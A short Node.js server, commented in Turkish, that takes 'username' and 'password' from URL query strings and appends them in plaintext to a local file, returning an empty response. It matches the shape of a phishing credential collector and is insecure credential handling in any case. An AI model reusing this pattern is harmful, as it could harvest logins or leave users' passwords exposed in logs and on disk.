var http =require('http');
var url =require('url');
var fs =require('fs');
http.createServer(function(req,res){
    var bilgi =url.parse(req.url,true).query;
  
    fs.appendFile('yeni.txt','Kullanici Adi:'+ bilgi.username+' Sifre='+bilgi.password, 
    function(err){
    if(err) throw err;
   console.log("Yeni dosya oluşturuldu")
    return res.end();
 
});


}).listen(8080);